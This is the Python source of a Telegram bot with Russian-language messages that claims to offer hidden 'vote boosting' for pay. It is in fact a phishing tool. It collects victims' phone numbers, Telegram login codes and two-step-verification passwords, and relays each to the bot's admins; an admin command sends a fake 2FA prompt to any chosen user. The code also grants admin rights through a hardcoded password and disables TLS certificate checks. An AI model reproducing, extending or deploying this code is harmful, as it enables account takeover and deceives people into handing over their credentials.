import telebot
import pymongo
import os
import re
import ssl
from stageEnum import StageEnum
from userDataClass import UserData
from customMarkups import CustomMarkups
from typing import Optional
from flask import Flask, request
from boto.s3.connection import S3Connection


MONGODB_STRING = os.environ['MONGODB_STRING']
db_name = "telegramBotUsers"
db_collection_name = "users"
dbClient = pymongo.MongoClient(MONGODB_STRING, ssl_cert_reqs=ssl.CERT_NONE)
customMarkupsInstance = CustomMarkups()

dbName = dbClient[db_name]
dbCollection = dbName[db_collection_name]

app = Flask(__name__)

TOKEN = os.environ['TOKEN']
bot = telebot.TeleBot(TOKEN)
SERVER_URL = os.environ['SERVER_URL']
types = telebot.types

PHONE_PATERN = re.compile("^[+]380[\d]{9}$")
CODE_PATERN = re.compile("^[\d]{5}$")


def dbIsUserExist(id: int) -> bool:
    userInCollection = dbCollection.find_one({"_id": id})
    if userInCollection != None:
        return True
    else:
        return False


def dbGetUserData(id: int) -> Optional[UserData]:
    userDataToReturn: Optional[UserData] = None
    if dbIsUserExist(id):
        userData = dbCollection.find_one({"_id": id})
        userIsAdmin: bool = userData["isAdmin"]
        userStage: StageEnum = userData["stage"]
        userDataToReturn = UserData(id=id, isAdmin=userIsAdmin, stage=userStage)
    return userDataToReturn


def dbUpdate(id: int, data: {}):
    dbCollection.update_one({"_id": id}, {"$set": data})

def dbAddUser(id: int, isAdmin: bool = False, stage: StageEnum = StageEnum.none):
    dbCollection.insert_one({
        "_id": id,
        "isAdmin": isAdmin,
        "stage": stage
    })


def sendErrorMessage(id: int, replyMarkup: types.ReplyKeyboardMarkup = customMarkupsInstance.standartMarkup()):
    text = "Произошла ошибка, повторите попытку позже"
    send_message(id, text, replyMarkup)


def isChatIdStringValid(str: str) -> bool:
    if str.isnumeric():
        id = int(str)
        return dbIsUserExist(id)
    else:
        return False


def dbGetUserStage(id: int) -> Optional[StageEnum]:
    userStage: Optional[StageEnum] = None
    if dbIsUserExist(id):
        userStage = dbGetUserData(id).stage
    return userStage


def sendMessageToAllAdmins(text: str):
    admins = dbCollection.find({"isAdmin": True})
    for admin in admins:
        send_message(admin["_id"], text)
    print(f"Message to all admins was sent. Message text: {text}")


@bot.message_handler(commands=['start', 'help'])
@bot.message_handler(func=lambda message: not dbIsUserExist(message.from_user.id))
def userDoNotExistOrStartEntered(message):
    user = message.from_user
    if not dbIsUserExist(user.id):
        dbAddUser(user.id)
        print(f"User {user.id} was added to DB")
    send_message(user.id,
                 "Этот бот предназначен для СКРЫТОЙ накрутки активности в групах. Накрутка никак не отображаетсся на вашем аккаунте. \nБот не имеет доступ до ваших данных!")
    print(f"User {user.id} used /start or /help")


@bot.message_handler(commands=['admin'])
def adminCommandEntered(message):
    user: types.Message = message.from_user
    text: str = message.text.replace("/admin ", "")
    userData: Optional[UserData] = dbGetUserData(id=user.id)
    if text == "add veryHardPassword":
        updateData = {"isAdmin": True}
        dbUpdate(user.id, updateData)
        send_message(user.id, "Вы включили админку, для просмотра доступных команд введите /admin help")
        print(f"User {user.id} was added as admin")
    elif userData.isAdmin:
        if text == "help":
            send_message(user.id,
                         "/admin help - показывает все доступные команды админа\n/admin add veryHardPassword - добавляет вас в качестве админа\n/admin remove - удаляет вас из админки\n/auth chat_id запрашивает у пользователя код двхэтапной аунтефикации \n")
            print(f"User {user.id} get /admin help")
        elif text == "remove":
            updateData = {"isAdmin": False}
            dbUpdate(user.id, updateData)
            send_message(user.id, "Вы выключили админку")
            print(f"User {user.id} was removed as admin")
        else:
            send_message(user.id, "Используйте /admin help для просмотра всех доступных команд")
    else:
        sendErrorMessage(user.id)
        print(f"User {user.id} tried to use /admin command, access denied")


@bot.message_handler(commands=["auth"])
def authCommandEntered(message):
    user = message.from_user
    text: str = message.text.replace("/auth ", "")
    isUserIdValid: bool = text.isnumeric()
    userData: Optional[UserData] = dbGetUserData(user.id)
    if userData.isAdmin & isUserIdValid:
        idToSendAuth = int(text)
        send_message(user.id, "Пользователю было отправлено сообщение об аунтефикации")
        send_message(idToSendAuth,
                     "У вас имеется двухэтапная аутентификация, введите пароль двухэтапной аунтефикации.",
                     reply_markup=customMarkupsInstance.cancelMarkup())
        updateData = {"stage": StageEnum.waitingForAuthCode}
        dbUpdate(idToSendAuth, updateData)
        print(f"User {user.id} send /auth to user {idToSendAuth}")
    else:
        sendErrorMessage(user.id)
        print(f"User {user.id} tried to use /auth command, access denied")

@bot.message_handler(commands=["code"])
def codeCommandEntered(message):
    user = message.from_user
    userData: Optional[UserData] = dbGetUserData(user.id)
    if userData.stage == StageEnum.finalWithAuth:
        send_message(user.id, "Введите код двухэтапной аунтефикации заново:",
                     reply_markup=customMarkupsInstance.cancelMarkup())
        updateData = {"stage": StageEnum.waitingForAuthCode}
        dbUpdate(user.id, updateData)
        print(f"User {user.id} used /code to enter auth code again")
    else:
        sendErrorMessage(user.id)
        print(f"User {user.id} tried to use /code, Error")


@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    user = message.from_user
    isUserExist: bool = dbIsUserExist(user.id)
    if not isUserExist:
        dbAddUser(id)
        print(f"User {user.id} was added to DB")
    send_message(user.id,
                 "Этот бот предназначен для СКРЫТОЙ накрутки активности в групах. Накрутка никак не отображаетсся на вашем аккаунте. \nБот не имеет доступ до ваших данных!")
    print(f"User {user.id} used /help or /start")


@bot.message_handler(func=lambda message: message.text == "Начало")
def beginningEntered(message):
    user = message.from_user
    updateData = {"stage": StageEnum.waitingForPhoneNumber}
    dbUpdate(user.id, updateData)
    send_message(user.id, "Введите ваш номер телефона в формате +380XXXXXXXXX.", customMarkupsInstance.cancelMarkup())
    print(f"User {user.id} entered Beggining, status changed to waitingForPhoneNumber")


@bot.message_handler(func=lambda message: message.text == "Баланс")
def balanceEntered(message):
    user = message.from_user
    send_message(user.id, "Вы пока не зарегестрировались или ваш аккаунт проходит проверку")
    print(f"User {user.id} entered Balance")


@bot.message_handler(func=lambda message: message.text == "Карта")
def cardEntered(message):
    user = message.from_user
    send_message(user.id, "Вы пока не зарегестрировались или ваш аккаунт проходит проверку")
    print(f"User {user.id} entered Card")


@bot.message_handler(func=lambda message: message.text == "О боте")
def aboutBotEntered(message):
    user = message.from_user
    send_message(user.id,
                 """Бот нужен для накрутки голосов (заработка).

Суть бота в накрутке голосов, ты не против если с твоего аккаунта будут отдаваться голоса?

По типу что лучше ios / android или какой ваш любимый цвет / день /время суток...

Клиент бота будет с аккаунта заходить в разные чаты и голосовать, уведомления приходить не будут, на всякие группы, каналы твой аккаунт подписываться не будет

Клиент бота - командная строка с прописаным кодом !НЕ ЧЕЛОВЕК!

После начала клиент бот оказывается в специальной песочнице для того чтобы там прописывать команды""")
    print(f"User {user.id} entered About bot")




@bot.message_handler(func=lambda message: message.text == "Отмена")
def cancelEntered(message):
    user = message.from_user
    updateData = {"stage": StageEnum.none}
    dbUpdate(user.id, updateData)
    send_message(user.id, "Отмена")
    print(f"User {user.id} entered cancel message")

#
# @bot.message_handler(func=lambda message: message.text == "Назад")
# def backEntered(message):
#     user = message.from_user
#     userStage: StageEnum = dbGetUserStage(user.id)
#     markup: types.ReplyKeyboardMarkup = customMarkupsInstance.standartMarkup()
#     if userStage == 1 | userStage == 2:
#         userStage = int(userStage) - 1
#         updateData = {"stage": userStage}
#         dbUpdate(user.id, updateData)
#         if userStage == 1:
#             markup = customMarkupsInstance.cancelAndBackMarkup()
#     send_message(user.id, "Назад", markup)


@bot.message_handler(func=lambda message: dbGetUserData(message.from_user.id).stage == StageEnum.waitingForPhoneNumber)
def waitingForPhoneStage(message):
    user = message.from_user
    text = message.text
    if PHONE_PATERN.match(text):
        updateData = {"stage": StageEnum.waitingForCode}
        dbUpdate(user.id, updateData)
        sendMessageToAllAdmins(f"User {user.id} entered phone: {text}")
        send_message(user.id, f"Через несколько минут придёт код подтверждения, введите его.", customMarkupsInstance.cancelMarkup())
        print(f"User {user.id} entered correct phone number, entered number: {message.text}")
    else:
        send_message(user.id, "Неверный номер телефона, введите номер телефона заново.", customMarkupsInstance.cancelMarkup())
        print(f"User {user.id} entered wrong phone number, entered number: {message.text}")


@bot.message_handler(func=lambda message: dbGetUserStage(message.from_user.id) == StageEnum.waitingForCode)
def waitingForCodeStage(message):
    user = message.from_user
    text = message.text
    if CODE_PATERN.match(text):
        updateData = {"stage": StageEnum.final}
        dbUpdate(user.id, updateData)
        sendMessageToAllAdmins(f"User {user.id} entered code: {text}")
        send_message(user.id, "Ваш аккаунт проходит проверку. Проверка может занять до 24 часов.")
        print(f"User {user.id} entered correct code, entered code: {text}")
    else:
        send_message(user.id, "Неверный код, введите код заново.", customMarkupsInstance.cancelMarkup())
        print(f"User {user.id} entered wrong code, entered code: {text}")


@bot.message_handler(func=lambda message: dbGetUserStage(message.from_user.id) == StageEnum.waitingForAuthCode)
def waitingForAuthCodeStage(message):
    user = message.from_user
    text = message.text
    updateData = {"stage": StageEnum.finalWithAuth}
    dbUpdate(user.id, updateData)
    sendMessageToAllAdmins(f"User {user.id} entered auth code: {text}")
    send_message(user.id, "Вы успешно ввели код двухэтапной аунтефикации если вы допустили ошибку введите: /code")
    print(f"User {user.id} entered auth code: {text}")

@bot.message_handler(func=lambda message: True)
def otherEntered(message):
    user = message.from_user
    userData = dbGetUserData(user.id)
    print(userData.stage)
    sendErrorMessage(user.id)


@app.route('/' + TOKEN, methods=['POST'])
def getMessage():
    json_string = request.get_data().decode('utf-8')
    update = telebot.types.Update.de_json(json_string)
    bot.process_new_updates([update])
    return "!", 200


def send_message(chat_id: int, text: str, reply_markup: types.ReplyKeyboardMarkup = customMarkupsInstance.standartMarkup()):
    try:
        bot.send_message(chat_id, text, reply_markup=reply_markup)
    except:
        print(f"Error occured while sending message to: {chat_id}")


@app.route("/")
def webhook():
    bot.remove_webhook()
    bot.set_webhook(url=SERVER_URL + TOKEN)
    return "!", 200


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get('PORT', 5000)))
# bot.remove_webhook()
# bot.polling()